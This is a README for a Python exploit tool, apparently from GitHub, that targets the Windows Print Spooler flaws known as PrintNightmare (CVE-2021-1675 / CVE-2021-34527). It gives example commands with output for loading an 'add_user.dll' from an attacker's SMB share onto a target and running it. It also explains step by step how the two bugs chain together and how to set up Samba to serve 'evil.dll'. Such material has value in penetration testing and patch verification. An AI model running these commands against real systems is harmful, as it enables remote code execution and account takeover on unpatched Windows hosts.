# PrintNightmare

Python implementation for PrintNightmare (CVE-2021-1675 / CVE-2021-34527) using standard Impacket.

## Installtion

```bash
$ pip3 install impacket
```

## Usage

```
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

usage: printnightmare.py [-h] [-debug] [-port [destination port]] [-target-ip ip address] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-dc-ip ip address]
                         [-name driver name] [-env driver name] [-path driver path] [-dll driver dll] [-check] [-list] [-delete]
                         target

PrintNightmare (CVE-2021-1675 / CVE-2021-34527)

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>

optional arguments:
  -h, --help            show this help message and exit
  -debug                Turn DEBUG output ON
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials
                        cannot be found, it will use the ones specified in the command line
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter

connection:
  -port [destination port]
                        Destination port to connect to MS-RPRN named pipe
  -target-ip ip address
                        IP Address of the target machine. If ommited it will use whatever was specified as target. This is useful when target is the
                        NetBIOS name and you cannot resolve it

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH

driver:
  -name driver name     Name for driver
  -env driver name      Environment for driver
  -path driver path     Driver path for driver
  -dll driver dll       Path to DLL

modes:
  -check                Check if target is vulnerable
  -list                 List existing printer drivers
  -delete               Deletes printer driver
```

### Examples

#### Exploitation

##### Remote DLL
```bash
$ ./printnightmare.py -dll '\\172.16.19.1\smb\add_user.dll' 'user:Passw0rd@172.16.19.128'
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Enumerating printer drivers
[*] Driver name: 'Microsoft XPS Document Writer v5'
[*] Driver path: 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_18b0d38ddfaee729\\Amd64\\UNIDRV.DLL'
[*] DLL path: '\\\\172.16.19.1\\smb\\add_user.dll'
[*] Copying over DLL
[*] Successfully copied over DLL
[*] Trying to load DLL
[*] Successfully loaded DLL
```

##### Local DLL
```bash
$ ./printnightmare.py -dll 'C:\Windows\System32\spool\drivers\x64\3\old\1\add_user.dll' 'user:Passw0rd@172.16.19.128'
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Enumerating printer drivers
[*] Driver name: 'Microsoft XPS Document Writer v5'
[*] Driver path: 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_18b0d38ddfaee729\\Amd64\\UNIDRV.DLL'
[*] DLL path: 'C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\1\\add_user.dll'
[*] Loading DLL
[*] Successfully loaded DLL
```

Notice that the local DLL example doesn't abuse CVE-2021-34527 to copy over the DLL.

##### Custom name
```bash
$ ./printnightmare.py -dll '\\172.16.19.1\smb\add_user.dll' -name 'My Printer Driver' 'user:Passw0rd@172.16.19.128'
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Enumerating printer drivers
[*] Driver name: 'My Printer Driver'
[*] Driver path: 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_18b0d38ddfaee729\\Amd64\\UNIDRV.DLL'
[*] DLL path: '\\\\172.16.19.1\\smb\\add_user.dll'
[*] Copying over DLL
[*] Successfully copied over DLL
[*] Trying to load DLL
[*] Successfully loaded DLL

$ ./printnightmare.py -list 'user:Passw0rd@172.16.19.128'
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Enumerating printer drivers
Name:               Microsoft XPS Document Writer v4
Environment:        Windows x64
Driver path:        C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\mxdwdrv.dll
Data file:          C:\Windows\System32\DriverStore\FileRepository\prnms001.inf_amd64_f340cb58fcd23202\MXDW.gpd
Config file:        C:\Windows\System32\DriverStore\FileRepository\prnms003.inf_amd64_9bf7e0c26ba91f8b\Amd64\PrintConfig.dll
Version:            4
----------------------------------------------------------------
Name:               Microsoft Print To PDF
Environment:        Windows x64
Driver path:        C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\mxdwdrv.dll
Data file:          C:\Windows\System32\DriverStore\FileRepository\prnms009.inf_amd64_80184dcbef6775bc\MPDW-PDC.xml
Config file:        C:\Windows\System32\DriverStore\FileRepository\prnms003.inf_amd64_9bf7e0c26ba91f8b\Amd64\PrintConfig.dll
Version:            4
----------------------------------------------------------------
Name:               My Printer Driver
Environment:        Windows x64
Driver path:        C:\Windows\system32\spool\DRIVERS\x64\3\UNIDRV.DLL
Data file:          C:\Windows\system32\spool\DRIVERS\x64\3\add_user.dll
Config file:        C:\Windows\system32\spool\DRIVERS\x64\3\add_user.dll
Version:            3
----------------------------------------------------------------
Name:               Microsoft Shared Fax Driver
Environment:        Windows x64
Driver path:        C:\Windows\system32\spool\DRIVERS\x64\3\FXSDRV.DLL
Data file:          C:\Windows\system32\spool\DRIVERS\x64\3\FXSUI.DLL
Config file:        C:\Windows\system32\spool\DRIVERS\x64\3\FXSUI.DLL
Version:            3
----------------------------------------------------------------
Name:               Microsoft enhanced Point and Print compatibility driver
Environment:        Windows x64
Driver path:        C:\Windows\system32\spool\DRIVERS\x64\3\mxdwdrv.dll
Data file:          C:\Windows\system32\spool\DRIVERS\x64\3\unishare.gpd
Config file:        C:\Windows\system32\spool\DRIVERS\x64\3\PrintConfig.dll
Version:            3
----------------------------------------------------------------
```

#### Check if target is vulnerable

##### Unpatched Windows 10
```bash
$ ./printnightmare.py -check 'user:Passw0rd@172.16.19.128'
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Target appears to be vulnerable!
```

##### Patched Windows Server 2022
```bash
$ ./printnightmare.py -check 'user:Passw0rd@172.16.19.135'
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[!] Target does not appear to be vulnerable
```

#### List current printer drivers

```bash
$ ./printnightmare.py -list 'user:Passw0rd@172.16.19.135'
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Enumerating printer drivers
Name:               Microsoft XPS Document Writer v4
Environment:        Windows x64
Driver path:        C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_075615bee6f80a8d\Amd64\mxdwdrv.dll
Data file:          C:\Windows\System32\DriverStore\FileRepository\prnms001.inf_amd64_8bc7809b71930efc\MXDW.gpd
Config file:        C:\Windows\System32\DriverStore\FileRepository\prnms003.inf_amd64_c9865835eff4a608\Amd64\PrintConfig.dll
Version:            4
----------------------------------------------------------------
Name:               Microsoft Print To PDF
Environment:        Windows x64
Driver path:        C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_075615bee6f80a8d\Amd64\mxdwdrv.dll
Data file:          C:\Windows\System32\DriverStore\FileRepository\prnms009.inf_amd64_6dc3549941ff1a57\MPDW-PDC.xml
Config file:        C:\Windows\System32\DriverStore\FileRepository\prnms003.inf_amd64_c9865835eff4a608\Amd64\PrintConfig.dll
Version:            4
----------------------------------------------------------------
Name:               Microsoft enhanced Point and Print compatibility driver
Environment:        Windows x64
Driver path:        C:\Windows\system32\spool\DRIVERS\x64\3\mxdwdrv.dll
Data file:          C:\Windows\system32\spool\DRIVERS\x64\3\unishare.gpd
Config file:        C:\Windows\system32\spool\DRIVERS\x64\3\PrintConfig.dll
Version:            3
----------------------------------------------------------------
```

#### Delete printer driver

May require administrative privileges.

```bash
$ ./printnightmare.py -delete -name 'Microsoft XPS Document Writer v5' 'administrator:Passw0rd@172.16.19.128'
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Deleted printer driver!
```

## Details

PrintNightmare consists of two CVE's, CVE-2021-1675 / CVE-2021-34527. 

### CVE-2021-1675

A non-administrative user is allowed to add a new printer driver. This vulnerability was fixed by only allowing administrators to add new printer drivers. A patched version of the print spooler will return `RPC_E_ACCESS_DENIED` (Code: `0x8001011b`) if a non-administrator tries to add a new printer driver. 

### CVE-2021-34527

When [adding a new printer driver](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/b96cc497-59e5-4510-ab04-5484993b259b), the `pDataFile` parameter in the [DRIVER_CONTAINER](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/3a3f9cf7-8ec4-4921-b1f6-86cf8d139bc2) allows UNC paths. The DLL specified in `pDataFile` will however **not** be loaded, *but* it will get copied over to a local path allowing us to create a new printer driver with the `pConfigFile` parameter pointing to the local path which will load the DLL. A patched version of the printer spooler will return `ERROR_INVALID_PARAMETER` (Code: `0x57`)

### Combining the pieces

Only CVE-2021-1675 is needed if the malicious DLL is already located on the target.

For PrintNightmare, if the DLL is not a local path, then CVE-2021-34527 can be used to fetch the DLL via UNC paths. For that reason, it is necessary to serve the DLL over SMB. If you're not familiar with SMB and UNC, read the following subsection.

When creating a new printer driver, the DLL in the `pDataFile` parameter will **not** be loaded for security reasons. However, it *will* be copied over to `C:\Windows\system32\spool\drivers\x64\3\`. Then, we could create a new printer driver that uses `pConfigFile` (which will load the DLL) with the local path. However, the DLL is in use by the first printer driver when creating the second printer driver. Instead, we could overwrite the first printer driver, which will make the printer driver's DLLs get copied over to `C:\Windows\system32\spool\drivers\x64\3\old\<I>\`, where `<I>` is incremented for each DLL. Now we can create a third printer driver that will use the local path `C:\Windows\system32\spool\drivers\x64\3\old\<I>\`, since the DLL is no longer used. Now it's just a matter of guessing `<I>` which will start incrementing from `1`.

Note that the DLL will keep its filename locally, so if you initially run the exploit with `foo.dll` and it gets saved to `C:\Windows\system32\spool\drivers\x64\3\old\1\foo.dll` and you then change the contents of `foo.dll` locally and run the exploit again and it now gets saved to `C:\Windows\system32\spool\drivers\x64\3\old\5\foo.dll`, then the original `foo.dll` will be used since it is located in `C:\Windows\system32\spool\drivers\x64\3\old\1\foo.dll`. Instead, simply change the filename if you change the contents of the DLL.

#### SMB and UNC

In short, a UNC path is a path to a file or folder on a network rather than a local file, and it contains the server name and path. For instance, the UNC path `\\10.0.0.2\files\foo.txt` is a file `foo.txt` that is served from the `files` share of the server `10.0.0.2`. Usually, a share is served over SMB, but WebDAV is also supported. To create an SMB share on Linux, the easiest and most reliable way is to use the `Samba` package.

To install `Samba` with `apt`:
```bash
$ sudo apt install samba
```

Edit the `/etc/samba/smb.conf` and add the following at the end of the file:
```
[smb]
    comment = Samba
    path = /tmp/share
    guest ok = yes
    read only = yes
    browsable = yes
    force user = nobody
```

This will create a new share called `smb` and serve the files inside `/tmp/share`. It allows for anonymous access, and the local user `nobody` will be used to browse the files.

Then start the Samba service by doing:
```bash
$ sudo service smbd start
```

Suppose your Linux machine has the IP `192.168.1.100` and you wish to serve the `evil.dll`, then the UNC path in this scenario will be `\\192.168.1.100\smb\evil.dll`. 

## Authors
- [@ly4k](https://github.com/ly4k)

## Credits
- [@cube0x0](https://github.com/cube0x0)'s [implementation](https://github.com/cube0x0/CVE-2021-1675)
- [Impacket](https://github.com/SecureAuthCorp/impacket)